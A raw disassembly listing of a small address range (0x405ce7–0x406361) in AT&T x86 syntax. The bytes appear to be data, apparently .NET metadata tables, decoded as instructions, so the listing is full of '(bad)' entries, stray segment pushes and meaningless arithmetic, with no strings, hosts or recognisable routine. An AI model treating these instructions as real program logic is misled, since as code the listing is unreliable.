  405ce7:	15 06 00 46 12       	adc    $0x12460006,%eax
  405cec:	5c                   	pop    %esp
  405ced:	02 0a                	add    (%edx),%cl
  405cef:	00 e0                	add    %ah,%al
  405cf1:	06                   	push   %es
  405cf2:	53                   	push   %ebx
  405cf3:	15 06 00 78 1d       	adc    $0x1d780006,%eax
  405cf8:	55                   	push   %ebp
  405cf9:	00 16                	add    %dl,(%esi)
  405cfb:	00 15 17 ed 02 06    	add    %dl,0x602ed17
  405d01:	00 47 0e             	add    %al,0xe(%edi)
  405d04:	55                   	push   %ebp
  405d05:	00 06                	add    %al,(%esi)
  405d07:	00 7d 06             	add    %bh,0x6(%ebp)
  405d0a:	5c                   	pop    %esp
  405d0b:	02 06                	add    (%esi),%al
  405d0d:	00 86 0f 5c 02 06    	add    %al,0x6025c0f(%esi)
  405d13:	00 13                	add    %dl,(%ebx)
  405d15:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d1a:	8d 14 5c             	lea    (%esp,%ebx,2),%edx
  405d1d:	02 06                	add    (%esi),%al
  405d1f:	00 3c 12             	add    %bh,(%edx,%edx,1)
  405d22:	5c                   	pop    %esp
  405d23:	02 16                	add    (%esi),%dl
  405d25:	00 55 12             	add    %dl,0x12(%ebp)
  405d28:	74 15                	je     0x405d3f
  405d2a:	1a 00                	sbb    (%eax),%al
  405d2c:	0c 14                	or     $0x14,%al
  405d2e:	95                   	xchg   %eax,%ebp
  405d2f:	1a 1a                	sbb    (%edx),%bl
  405d31:	00 91 11 95 1a 8b    	add    %dl,-0x74e56aef(%ecx)
  405d37:	01 c5                	add    %eax,%ebp
  405d39:	14 00                	adc    $0x0,%al
  405d3b:	00 1a                	add    %bl,(%edx)
  405d3d:	00 31                	add    %dh,(%ecx)
  405d3f:	19 95 1a 06 00 4c    	sbb    %edx,0x4c00061a(%ebp)
  405d45:	15 04 10 06 00       	adc    $0x61004,%eax
  405d4a:	7a 00                	jp     0x405d4c
  405d4c:	04 10                	add    $0x10,%al
  405d4e:	06                   	push   %es
  405d4f:	00 fb                	add    %bh,%bl
  405d51:	0f 04                	(bad)
  405d53:	10 06                	adc    %al,(%esi)
  405d55:	00 da                	add    %bl,%dl
  405d57:	00 04 10             	add    %al,(%eax,%edx,1)
  405d5a:	06                   	push   %es
  405d5b:	00 f4                	add    %dh,%ah
  405d5d:	12 0e                	adc    (%esi),%cl
  405d5f:	1d 06 00 43 10       	sbb    $0x10430006,%eax
  405d64:	0e                   	push   %cs
  405d65:	1d 06 00 b8 07       	sbb    $0x7b80006,%eax
  405d6a:	04 10                	add    $0x10,%al
  405d6c:	06                   	push   %es
  405d6d:	00 96 10 04 10 1e    	add    %dl,0x1e100410(%esi)
  405d73:	00 3a                	add    %bh,(%edx)
  405d75:	11 bc 17 06 00 af 1d 	adc    %edi,0x1daf0006(%edi,%edx,1)
  405d7c:	ce                   	into
  405d7d:	0e                   	push   %cs
  405d7e:	06                   	push   %es
  405d7f:	00 e8                	add    %ch,%al
  405d81:	0e                   	push   %cs
  405d82:	ce                   	into
  405d83:	0e                   	push   %cs
  405d84:	06                   	push   %es
  405d85:	00 8b 06 ce 0e 06    	add    %cl,0x60ece06(%ebx)
  405d8b:	00 80 03 04 10 06    	add    %al,0x6100403(%eax)
  405d91:	00 2b                	add    %ch,(%ebx)
  405d93:	06                   	push   %es
  405d94:	ae                   	scas   %es:(%edi),%al
  405d95:	0b 0a                	or     (%edx),%ecx
  405d97:	00 25 14 55 00 0a    	add    %ah,0xa005514
  405d9d:	00 a9 18 55 00 06    	add    %ch,0x6005518(%ecx)
  405da3:	00 e1                	add    %ah,%cl
  405da5:	04 55                	add    $0x55,%al
  405da7:	00 43 00             	add    %al,0x0(%ebx)
  405daa:	02 15 00 00 12 00    	add    0x120000,%dl
  405db0:	ae                   	scas   %es:(%edi),%al
  405db1:	05 d0 12 06 00       	add    $0x612d0,%eax
  405db6:	12 00                	adc    (%eax),%al
  405db8:	d2 02                	rolb   %cl,(%edx)
  405dba:	06                   	push   %es
  405dbb:	00 c8                	add    %cl,%al
  405dbd:	10 04 10             	adc    %al,(%eax,%edx,1)
  405dc0:	06                   	push   %es
  405dc1:	00 2b                	add    %ch,(%ebx)
  405dc3:	1d 65 11 06 00       	sbb    $0x61165,%eax
  405dc8:	44                   	inc    %esp
  405dc9:	08 04 10             	or     %al,(%eax,%edx,1)
  405dcc:	06                   	push   %es
  405dcd:	00 0d 15 04 10 06    	add    %cl,0x6100415
  405dd3:	00 07                	add    %al,(%edi)
  405dd5:	06                   	push   %es
  405dd6:	04 10                	add    $0x10,%al
  405dd8:	22 00                	and    (%eax),%al
  405dda:	62 12                	bound  %edx,(%edx)
  405ddc:	6b 13 22             	imul   $0x22,(%ebx),%edx
  405ddf:	00 e3                	add    %ah,%bl
  405de1:	16                   	push   %ss
  405de2:	6b 13 22             	imul   $0x22,(%ebx),%edx
  405de5:	00 92 13 6b 13 12    	add    %dl,0x12136b13(%edx)
  405deb:	00 8a 13 b1 15 22    	add    %cl,0x2215b113(%edx)
  405df1:	00 fb                	add    %bh,%bl
  405df3:	16                   	push   %ss
  405df4:	6b 13 06             	imul   $0x6,(%ebx),%edx
  405df7:	00 6b 16             	add    %ch,0x16(%ebx)
  405dfa:	0e                   	push   %cs
  405dfb:	1d 06 00 01 12       	sbb    $0x12010006,%eax
  405e00:	04 10                	add    $0x10,%al
  405e02:	06                   	push   %es
  405e03:	00 72 16             	add    %dh,0x16(%edx)
  405e06:	0e                   	push   %cs
  405e07:	1d 12 00 26 13       	sbb    $0x13260012,%eax
  405e0c:	0e                   	push   %cs
  405e0d:	1d 06 00 ba 0f       	sbb    $0xfba0006,%eax
  405e12:	0e                   	push   %cs
  405e13:	1d 06 00 fb 00       	sbb    $0xfb0006,%eax
  405e18:	0e                   	push   %cs
  405e19:	1d 06 00 eb 11       	sbb    $0x11eb0006,%eax
  405e1e:	04 10                	add    $0x10,%al
  405e20:	06                   	push   %es
  405e21:	00 1c 10             	add    %bl,(%eax,%edx,1)
  405e24:	0e                   	push   %cs
  405e25:	1d 06 00 58 05       	sbb    $0x5580006,%eax
  405e2a:	0e                   	push   %cs
  405e2b:	1d 06 00 1c 05       	sbb    $0x51c0006,%eax
  405e30:	0e                   	push   %cs
  405e31:	1d 06 00 5d 10       	sbb    $0x105d0006,%eax
  405e36:	0e                   	push   %cs
  405e37:	1d 06 00 37 05       	sbb    $0x5370006,%eax
  405e3c:	0e                   	push   %cs
  405e3d:	1d 06 00 d4 11       	sbb    $0x11d40006,%eax
  405e42:	0e                   	push   %cs
  405e43:	1d 06 00 b3 13       	sbb    $0x13b30006,%eax
  405e48:	04 10                	add    $0x10,%al
  405e4a:	06                   	push   %es
  405e4b:	00 a1 1c 04 10 06    	add    %ah,0x610041c(%ecx)
  405e51:	00 15 18 b1 15 06    	add    %dl,0x615b118
  405e57:	00 e4                	add    %ah,%ah
  405e59:	05 04 10 06 00       	add    $0x61004,%eax
  405e5e:	37                   	aaa
  405e5f:	03 0e                	add    (%esi),%ecx
  405e61:	1d 06 00 c7 00       	sbb    $0xc70006,%eax
  405e66:	04 10                	add    $0x10,%al
  405e68:	06                   	push   %es
  405e69:	00 d2                	add    %dl,%dl
  405e6b:	05 04 10 06 00       	add    $0x61004,%eax
  405e70:	50                   	push   %eax
  405e71:	06                   	push   %es
  405e72:	04 10                	add    $0x10,%al
  405e74:	06                   	push   %es
  405e75:	00 44 18 5c          	add    %al,0x5c(%eax,%ebx,1)
  405e79:	02 06                	add    (%esi),%al
  405e7b:	00 49 08             	add    %cl,0x8(%ecx)
  405e7e:	5c                   	pop    %esp
  405e7f:	02 0a                	add    (%edx),%cl
  405e81:	00 c7                	add    %al,%bh
  405e83:	0f 24 11             	mov    %tr2,%ecx
  405e86:	0a 00                	or     (%eax),%al
  405e88:	48                   	dec    %eax
  405e89:	05 24 11 00 00       	add    $0x1124,%eax
  405e8e:	00 00                	add    %al,(%eax)
  405e90:	40                   	inc    %eax
  405e91:	01 00                	add    %eax,(%eax)
  405e93:	00 00                	add    %al,(%eax)
  405e95:	00 01                	add    %al,(%ecx)
  405e97:	00 01                	add    %al,(%ecx)
  405e99:	00 01                	add    %al,(%ecx)
  405e9b:	00 10                	add    %dl,(%eax)
  405e9d:	00 df                	add    %bl,%bh
  405e9f:	0f 8e 1a 05 00 01    	jle    0x14063bf
  405ea5:	00 01                	add    %al,(%ecx)
  405ea7:	00 81 01 10 00 27    	add    %al,0x27001001(%ecx)
  405ead:	17                   	pop    %ss
  405eae:	8e 1a                	mov    (%edx),%ds
  405eb0:	05 00 01 00 03       	add    $0x3000100,%eax
  405eb5:	00 81 01 10 00 af    	add    %al,-0x50ffefff(%ecx)
  405ebb:	19 ac 11 05 00 13 00 	sbb    %ebp,0x130005(%ecx,%edx,1)
  405ec2:	06                   	push   %es
  405ec3:	00 00                	add    %al,(%eax)
  405ec5:	00 10                	add    %dl,(%eax)
  405ec7:	00 c2                	add    %al,%dl
  405ec9:	12 1c 0f             	adc    (%edi,%ecx,1),%bl
  405ecc:	05 00 1e 00 24       	add    $0x24001e00,%eax
  405ed1:	00 00                	add    %al,(%eax)
  405ed3:	00 10                	add    %dl,(%eax)
  405ed5:	00 47 17             	add    %al,0x17(%edi)
  405ed8:	4b                   	dec    %ebx
  405ed9:	14 05                	adc    $0x5,%al
  405edb:	00 1e                	add    %bl,(%esi)
  405edd:	00 26                	add    %ah,(%esi)
  405edf:	00 81 01 10 00 9e    	add    %al,-0x61ffefff(%ecx)
  405ee5:	10 4b 14             	adc    %cl,0x14(%ebx)
  405ee8:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405eed:	00 81 01 10 00 5b    	add    %al,0x5b001001(%ecx)
  405ef3:	13 4b 14             	adc    0x14(%ebx),%ecx
  405ef6:	05 00 1e 00 2f       	add    $0x2f001e00,%eax
  405efb:	00 81 01 10 00 6c    	add    %al,0x6c001001(%ecx)
  405f01:	15 4b 14 05 00       	adc    $0x5144b,%eax
  405f06:	1e                   	push   %ds
  405f07:	00 30                	add    %dh,(%eax)
  405f09:	00 81 01 10 00 6b    	add    %al,0x6b001001(%ecx)
  405f0f:	0f 4b 14 05 00 1e 00 	cmovnp 0x36001e00(,%eax,1),%edx
  405f16:	36 
  405f17:	00 81 01 10 00 66    	add    %al,0x66001001(%ecx)
  405f1d:	15 4b 14 05 00       	adc    $0x5144b,%eax
  405f22:	1f                   	pop    %ds
  405f23:	00 38                	add    %bh,(%eax)
  405f25:	00 02                	add    %al,(%edx)
  405f27:	01 00                	add    %eax,(%eax)
  405f29:	00 01                	add    %al,(%ecx)
  405f2b:	02 00                	add    (%eax),%al
  405f2d:	00 39                	add    %bh,(%ecx)
  405f2f:	00 1f                	add    %bl,(%edi)
  405f31:	00 3e                	add    %bh,(%esi)
  405f33:	00 81 01 10 00 ac    	add    %al,-0x53ffefff(%ecx)
  405f39:	0e                   	push   %cs
  405f3a:	4b                   	dec    %ebx
  405f3b:	14 05                	adc    $0x5,%al
  405f3d:	00 23                	add    %ah,(%ebx)
  405f3f:	00 3e                	add    %bh,(%esi)
  405f41:	00 81 01 10 00 75    	add    %al,0x75001001(%ecx)
  405f47:	1d 4b 14 05 00       	sbb    $0x5144b,%eax
  405f4c:	23 00                	and    (%eax),%eax
  405f4e:	41                   	inc    %ecx
  405f4f:	00 81 01 10 00 a8    	add    %al,-0x57ffefff(%ecx)
  405f55:	19 8a 19 05 00 24    	sbb    %ecx,0x24000519(%edx)
  405f5b:	00 46 00             	add    %al,0x0(%esi)
  405f5e:	83 01 10             	addl   $0x10,(%ecx)
  405f61:	00 80 00 00 00 05    	add    %al,0x5000000(%eax)
  405f67:	00 25 00 4b 00 01    	add    %ah,0x1004b00
  405f6d:	00 10                	add    %dl,(%eax)
  405f6f:	00 0d 01 0b 10 05    	add    %cl,0x5100b01
  405f75:	00 26                	add    %ah,(%esi)
  405f77:	00 4b 00             	add    %cl,0x0(%ebx)
  405f7a:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f80:	0b 10                	or     (%eax),%edx
  405f82:	05 00 2d 00 52       	add    $0x52002d00,%eax
  405f87:	00 00                	add    %al,(%eax)
  405f89:	01 00                	add    %eax,(%eax)
  405f8b:	00 58 01             	add    %bl,0x1(%eax)
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f95:	00 13                	add    %dl,(%ebx)
  405f97:	01 00                	add    %eax,(%eax)
  405f99:	00 38                	add    %bh,(%eax)
  405f9b:	00 00                	add    %al,(%eax)
  405f9d:	00 51 00             	add    %dl,0x0(%ecx)
  405fa0:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405fa5:	00 10                	add    %dl,(%eax)
  405fa7:	00 b1 17 d5 0d 05    	add    %dh,0x50dd517(%ecx)
  405fad:	00 2e                	add    %ch,(%esi)
  405faf:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fb3:	00 10                	add    %dl,(%eax)
  405fb5:	00 6e 10             	add    %ch,0x10(%esi)
  405fb8:	d5 0d                	aad    $0xd
  405fba:	05 00 2f 00 5f       	add    $0x5f002f00,%eax
  405fbf:	00 01                	add    %al,(%ecx)
  405fc1:	00 10                	add    %dl,(%eax)
  405fc3:	00 7b 1c             	add    %bh,0x1c(%ebx)
  405fc6:	d5 0d                	aad    $0xd
  405fc8:	05 00 31 00 63       	add    $0x63003100,%eax
  405fcd:	00 01                	add    %al,(%ecx)
  405fcf:	00 10                	add    %dl,(%eax)
  405fd1:	00 f0                	add    %dh,%al
  405fd3:	0d d5 0d 05 00       	or     $0x50dd5,%eax
  405fd8:	33 00                	xor    (%eax),%eax
  405fda:	6a 00                	push   $0x0
  405fdc:	01 01                	add    %eax,(%ecx)
  405fde:	00 00                	add    %al,(%eax)
  405fe0:	1d 08 d5 0d 39       	sbb    $0x390dd508,%eax
  405fe5:	00 3a                	add    %bh,(%edx)
  405fe7:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fed:	00 9c 17 d5 0d 05 00 	add    %bl,0x50dd5(%edi,%edx,1)
  405ff4:	47                   	inc    %edi
  405ff5:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405ffb:	00 a6 17 d5 0d 05    	add    %ah,0x50dd517(%esi)
  406001:	00 47 00             	add    %al,0x0(%edi)
  406004:	99                   	cltd
  406005:	00 81 01 10 00 9c    	add    %al,-0x63ffefff(%ecx)
  40600b:	12 d5                	adc    %ch,%dl
  40600d:	0d 05 00 47 00       	or     $0x470005,%eax
  406012:	a2 00 00 01 00       	mov    %al,0x10000
  406017:	00 49 01             	add    %cl,0x1(%ecx)
  40601a:	00 00                	add    %al,(%eax)
  40601c:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406021:	00 13                	add    %dl,(%ebx)
  406023:	01 00                	add    %eax,(%eax)
  406025:	00 1b                	add    %bl,(%ebx)
  406027:	01 00                	add    %eax,(%eax)
  406029:	00 51 00             	add    %dl,0x0(%ecx)
  40602c:	48                   	dec    %eax
  40602d:	00 a4 00 16 00 b6 18 	add    %ah,0x18b60016(%eax,%eax,1)
  406034:	12 00                	adc    (%eax),%al
  406036:	16                   	push   %ss
  406037:	00 c3                	add    %al,%bl
  406039:	18 12                	sbb    %dl,(%edx)
  40603b:	00 16                	add    %dl,(%esi)
  40603d:	00 1c 11             	add    %bl,(%ecx,%edx,1)
  406040:	12 00                	adc    (%eax),%al
  406042:	16                   	push   %ss
  406043:	00 23                	add    %ah,(%ebx)
  406045:	0f 12 00             	movlps (%eax),%xmm0
  406048:	16                   	push   %ss
  406049:	00 4d 13             	add    %cl,0x13(%ebp)
  40604c:	12 00                	adc    (%eax),%al
  40604e:	16                   	push   %ss
  40604f:	00 57 06             	add    %dl,0x6(%edi)
  406052:	12 00                	adc    (%eax),%al
  406054:	16                   	push   %ss
  406055:	00 05 1d 12 00 16    	add    %al,0x1600121d
  40605b:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406061:	00 ac 08 12 00 16 00 	add    %ch,0x160012(%eax,%ecx,1)
  406068:	5f                   	pop    %edi
  406069:	08 12                	or     %dl,(%edx)
  40606b:	00 16                	add    %dl,(%esi)
  40606d:	00 a6 08 15 00 16    	add    %ah,0x16001508(%esi)
  406073:	00 b9 0d 12 00 16    	add    %bh,0x1600120d(%ecx)
  406079:	00 14 01             	add    %dl,(%ecx,%eax,1)
  40607c:	19 00                	sbb    %eax,(%eax)
  40607e:	16                   	push   %ss
  40607f:	00 e4                	add    %ah,%ah
  406081:	10 12                	adc    %dl,(%edx)
  406083:	00 16                	add    %dl,(%esi)
  406085:	00 6b 02             	add    %ch,0x2(%ebx)
  406088:	12 00                	adc    (%eax),%al
  40608a:	16                   	push   %ss
  40608b:	00 85 03 12 00 16    	add    %al,0x16001203(%ebp)
  406091:	00 5a 1c             	add    %bl,0x1c(%edx)
  406094:	12 00                	adc    (%eax),%al
  406096:	16                   	push   %ss
  406097:	00 bc 12 12 00 11 00 	add    %bh,0x110012(%edx,%edx,1)
  40609e:	91                   	xchg   %eax,%ecx
  40609f:	04 21                	add    $0x21,%al
  4060a1:	00 11                	add    %dl,(%ecx)
  4060a3:	00 76 04             	add    %dh,0x4(%esi)
  4060a6:	25 00 11 00 46       	and    $0x46001100,%eax
  4060ab:	04 29                	add    $0x29,%al
  4060ad:	00 11                	add    %dl,(%ecx)
  4060af:	00 dc                	add    %bl,%ah
  4060b1:	03 2d 00 11 00 5e    	add    0x5e001100,%ebp
  4060b7:	04 2d                	add    $0x2d,%al
  4060b9:	00 11                	add    %dl,(%ecx)
  4060bb:	00 c1                	add    %al,%cl
  4060bd:	03 30                	add    (%eax),%esi
  4060bf:	00 11                	add    %dl,(%ecx)
  4060c1:	00 a4 03 34 00 31 00 	add    %ah,0x310034(%ebx,%eax,1)
  4060c8:	8a 03                	mov    (%ebx),%al
  4060ca:	37                   	aaa
  4060cb:	00 11                	add    %dl,(%ecx)
  4060cd:	00 f8                	add    %bh,%al
  4060cf:	03 30                	add    (%eax),%esi
  4060d1:	00 11                	add    %dl,(%ecx)
  4060d3:	00 2c 04             	add    %ch,(%esp,%eax,1)
  4060d6:	3a 00                	cmp    (%eax),%al
  4060d8:	11 00                	adc    %eax,(%eax)
  4060da:	0e                   	push   %cs
  4060db:	04 34                	add    $0x34,%al
  4060dd:	00 16                	add    %dl,(%esi)
  4060df:	00 a0 12 dc 00 06    	add    %ah,0x600dc12(%eax)
  4060e5:	06                   	push   %es
  4060e6:	ac                   	lods   %ds:(%esi),%al
  4060e7:	02 06                	add    (%esi),%al
  4060e9:	01 56 80             	add    %edx,-0x80(%esi)
  4060ec:	70 02                	jo     0x4060f0
  4060ee:	09 01                	or     %eax,(%ecx)
  4060f0:	56                   	push   %esi
  4060f1:	80 ce 01             	or     $0x1,%dh
  4060f4:	09 01                	or     %eax,(%ecx)
  4060f6:	56                   	push   %esi
  4060f7:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060fe:	fe 01                	incb   (%ecx)
  406100:	12 00                	adc    (%eax),%al
  406102:	16                   	push   %ss
  406103:	00 65 17             	add    %ah,0x17(%ebp)
  406106:	30 01                	xor    %al,(%ecx)
  406108:	16                   	push   %ss
  406109:	00 0b                	add    %cl,(%ebx)
  40610b:	00 43 01             	add    %al,0x1(%ebx)
  40610e:	51                   	push   %ecx
  40610f:	80 ab 0d 3a 00 51 80 	subb   $0x80,0x51003a0d(%ebx)
  406116:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406117:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  40611c:	9e                   	sahf
  40611d:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406122:	82 0d 3a 00 21 00 09 	orb    $0x9,0x21003a
  406129:	1d 29 00 21 00       	sbb    $0x210029,%eax
  40612e:	ea 1c 29 00 31 00 0a 	ljmp   $0xa00,$0x3100291c
  406135:	1a 29                	sbb    (%ecx),%ch
  406137:	00 33                	add    %dh,(%ebx)
  406139:	01 77 01             	add    %esi,0x1(%edi)
  40613c:	8b 01                	mov    (%ecx),%eax
  40613e:	11 00                	adc    %eax,(%eax)
  406140:	6e                   	outsb  %ds:(%esi),(%dx)
  406141:	05 8f 01 01 00       	add    $0x1018f,%eax
  406146:	aa                   	stos   %al,%es:(%edi)
  406147:	10 30                	adc    %dh,(%eax)
  406149:	01 01                	add    %eax,(%ecx)
  40614b:	00 cb                	add    %cl,%bl
  40614d:	11 3a                	adc    %edi,(%edx)
  40614f:	00 01                	add    %al,(%ecx)
  406151:	00 aa 10 30 01 01    	add    %ch,0x1013010(%edx)
  406157:	00 45 14             	add    %al,0x14(%ebp)
  40615a:	c7 01 01 00 b3 07    	movl   $0x7b30001,(%ecx)
  406160:	12 00                	adc    (%eax),%al
  406162:	01 00                	add    %eax,(%eax)
  406164:	93                   	xchg   %eax,%ebx
  406165:	07                   	pop    %es
  406166:	12 00                	adc    (%eax),%al
  406168:	01 00                	add    %eax,(%eax)
  40616a:	b5 0a                	mov    $0xa,%ch
  40616c:	37                   	aaa
  40616d:	00 01                	add    %al,(%ecx)
  40616f:	00 13                	add    %dl,(%ebx)
  406171:	08 02                	or     %al,(%edx)
  406173:	02 01                	add    (%ecx),%al
  406175:	00 b3 1a c7 01 01    	add    %dh,0x101c71a(%ebx)
  40617b:	00 aa 10 30 01 01    	add    %ch,0x1013010(%edx)
  406181:	00 9c 1c 06 02 06 06 	add    %bl,0x6060206(%esp,%ebx,1)
  406188:	ac                   	lods   %ds:(%esi),%al
  406189:	02 3a                	add    (%edx),%bh
  40618b:	00 56 80             	add    %dl,-0x80(%esi)
  40618e:	13 12                	adc    (%edx),%edx
  406190:	02 02                	add    (%edx),%al
  406192:	56                   	push   %esi
  406193:	80 66 0f 02          	andb   $0x2,0xf(%esi)
  406197:	02 56 80             	add    -0x80(%esi),%dl
  40619a:	8b 12                	mov    (%edx),%edx
  40619c:	02 02                	add    (%edx),%al
  40619e:	56                   	push   %esi
  40619f:	80 a1 1c 02 02 56 80 	andb   $0x80,0x5602021c(%ecx)
  4061a6:	d9 0c 02             	(bad) (%edx,%eax,1)
  4061a9:	02 56 80             	add    -0x80(%esi),%dl
  4061ac:	f5                   	cmc
  4061ad:	13 02                	adc    (%edx),%eax
  4061af:	02 56 80             	add    -0x80(%esi),%dl
  4061b2:	c7 00 02 02 56 80    	movl   $0x80560202,(%eax)
  4061b8:	96                   	xchg   %eax,%esi
  4061b9:	10 02                	adc    %al,(%edx)
  4061bb:	02 56 80             	add    -0x80(%esi),%dl
  4061be:	20 19                	and    %bl,(%ecx)
  4061c0:	02 02                	add    (%edx),%al
  4061c2:	56                   	push   %esi
  4061c3:	80 50 06 02          	adcb   $0x2,0x6(%eax)
  4061c7:	02 56 80             	add    -0x80(%esi),%dl
  4061ca:	b8 07 02 02 56       	mov    $0x56020207,%eax
  4061cf:	80 5a 1d 02          	sbbb   $0x2,0x1d(%edx)
  4061d3:	02 33                	add    (%ebx),%dh
  4061d5:	01 11                	add    %edx,(%ecx)
  4061d7:	02 fd                	add    %ch,%bh
  4061d9:	02 08                	add    (%eax),%cl
  4061db:	26 00 00             	add    %al,%es:(%eax)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	96                   	xchg   %eax,%esi
  4061e1:	00 b3 10 0a 00 01    	add    %dh,0x1000a10(%ebx)
  4061e7:	00 78 20             	add    %bh,0x20(%eax)
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	86 18                	xchg   %bl,(%eax)
  4061f0:	17                   	pop    %ss
  4061f1:	15 0e 00 01 00       	adc    $0x1000e,%eax
  4061f6:	f8                   	clc
  4061f7:	26 00 00             	add    %al,%es:(%eax)
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	96                   	xchg   %eax,%esi
  4061fd:	00 1d 17 1d 00 01    	add    %bl,0x1001d17
  406203:	00 50 28             	add    %dl,0x28(%eax)
  406206:	00 00                	add    %al,(%eax)
  406208:	00 00                	add    %al,(%eax)
  40620a:	91                   	xchg   %eax,%ecx
  40620b:	00 4d 0d             	add    %cl,0xd(%ebp)
  40620e:	1d 00 01 00 c0       	sbb    $0xc0000100,%eax
  406213:	28 00                	sub    %al,(%eax)
  406215:	00 00                	add    %al,(%eax)
  406217:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  40621d:	00 01                	add    %al,(%ecx)
  40621f:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  406225:	00 96 08 64 1a 3d    	add    %dl,0x3d1a6408(%esi)
  40622b:	00 01                	add    %al,(%ecx)
  40622d:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  406233:	00 96 08 72 1a 42    	add    %dl,0x421a7208(%esi)
  406239:	00 01                	add    %al,(%ecx)
  40623b:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406241:	00 96 08 48 1a 48    	add    %dl,0x481a4808(%esi)
  406247:	00 02                	add    %al,(%edx)
  406249:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  40624f:	00 96 08 56 1a 4d    	add    %dl,0x4d1a5608(%esi)
  406255:	00 02                	add    %al,(%edx)
  406257:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  40625d:	00 91 08 a4 13 53    	add    %dl,0x5313a408(%ecx)
  406263:	00 03                	add    %al,(%ebx)
  406265:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  40626b:	00 91 08 af 13 58    	add    %dl,0x5813af08(%ecx)
  406271:	00 03                	add    %al,(%ebx)
  406273:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406279:	00 91 08 2c 0b 5e    	add    %dl,0x5e0b2c08(%ecx)
  40627f:	00 04 00             	add    %al,(%eax,%eax,1)
  406282:	b4 20                	mov    $0x20,%ah
  406284:	00 00                	add    %al,(%eax)
  406286:	00 00                	add    %al,(%eax)
  406288:	91                   	xchg   %eax,%ecx
  406289:	08 3b                	or     %bh,(%ebx)
  40628b:	0b 62 00             	or     0x0(%edx),%esp
  40628e:	04 00                	add    $0x0,%al
  406290:	bc 20 00 00 00       	mov    $0x20,%esp
  406295:	00 91 08 e1 19 5e    	add    %dl,0x5e19e108(%ecx)
  40629b:	00 05 00 c3 20 00    	add    %al,0x20c300
  4062a1:	00 00                	add    %al,(%eax)
  4062a3:	00 91 08 ec 19 62    	add    %dl,0x6219ec08(%ecx)
  4062a9:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062af:	00 00                	add    %al,(%eax)
  4062b1:	00 91 08 d8 0a 67    	add    %dl,0x670ad808(%ecx)
  4062b7:	00 06                	add    %al,(%esi)
  4062b9:	00 d2                	add    %dl,%dl
  4062bb:	20 00                	and    %al,(%eax)
  4062bd:	00 00                	add    %al,(%eax)
  4062bf:	00 91 08 e6 0a 6c    	add    %dl,0x6c0ae608(%ecx)
  4062c5:	00 06                	add    %al,(%esi)
  4062c7:	00 da                	add    %bl,%dl
  4062c9:	20 00                	and    %al,(%eax)
  4062cb:	00 00                	add    %al,(%eax)
  4062cd:	00 96 08 53 03 1d    	add    %dl,0x1d035308(%esi)
  4062d3:	00 07                	add    %al,(%edi)
  4062d5:	00 e1                	add    %ah,%cl
  4062d7:	20 00                	and    %al,(%eax)
  4062d9:	00 00                	add    %al,(%eax)
  4062db:	00 96 08 63 03 72    	add    %dl,0x72036308(%esi)
  4062e1:	00 07                	add    %al,(%edi)
  4062e3:	00 e9                	add    %ch,%cl
  4062e5:	20 00                	and    %al,(%eax)
  4062e7:	00 00                	add    %al,(%eax)
  4062e9:	00 91 08 03 03 77    	add    %dl,0x77030308(%ecx)
  4062ef:	00 08                	add    %cl,(%eax)
  4062f1:	00 f0                	add    %dh,%al
  4062f3:	20 00                	and    %al,(%eax)
  4062f5:	00 00                	add    %al,(%eax)
  4062f7:	00 91 08 9c 0b 67    	add    %dl,0x670b9c08(%ecx)
  4062fd:	00 08                	add    %cl,(%eax)
  4062ff:	00 f7                	add    %dh,%bh
  406301:	20 00                	and    %al,(%eax)
  406303:	00 00                	add    %al,(%eax)
  406305:	00 91 08 a5 0b 6c    	add    %dl,0x6c0ba508(%ecx)
  40630b:	00 08                	add    %cl,(%eax)
  40630d:	00 ff                	add    %bh,%bh
  40630f:	20 00                	and    %al,(%eax)
  406311:	00 00                	add    %al,(%eax)
  406313:	00 96 08 02 0f 7b    	add    %dl,0x7b0f0208(%esi)
  406319:	00 09                	add    %cl,(%ecx)
  40631b:	00 06                	add    %al,(%esi)
  40631d:	21 00                	and    %eax,(%eax)
  40631f:	00 00                	add    %al,(%eax)
  406321:	00 96 08 0f 0f 7f    	add    %dl,0x7f0f0f08(%esi)
  406327:	00 09                	add    %cl,(%ecx)
  406329:	00 0e                	add    %cl,(%esi)
  40632b:	21 00                	and    %eax,(%eax)
  40632d:	00 00                	add    %al,(%eax)
  40632f:	00 96 08 f9 0c 1d    	add    %dl,0x1d0cf908(%esi)
  406335:	00 0a                	add    %cl,(%edx)
  406337:	00 15 21 00 00 00    	add    %dl,0x21
  40633d:	00 96 08 0a 0d 72    	add    %dl,0x720d0a08(%esi)
  406343:	00 0a                	add    %cl,(%edx)
  406345:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406349:	00 00                	add    %al,(%eax)
  40634b:	00 96 00 37 1a 0a    	add    %dl,0xa1a3700(%esi)
  406351:	00 0b                	add    %cl,(%ebx)
  406353:	00 1d 21 00 00 00    	add    %bl,0x21
  406359:	00 91 00 74 07 84    	add    %dl,-0x7bf88c00(%ecx)
  40635f:	00 0b                	add    %cl,(%ebx)
  406361:	00 28                	add    %ch,(%eax)
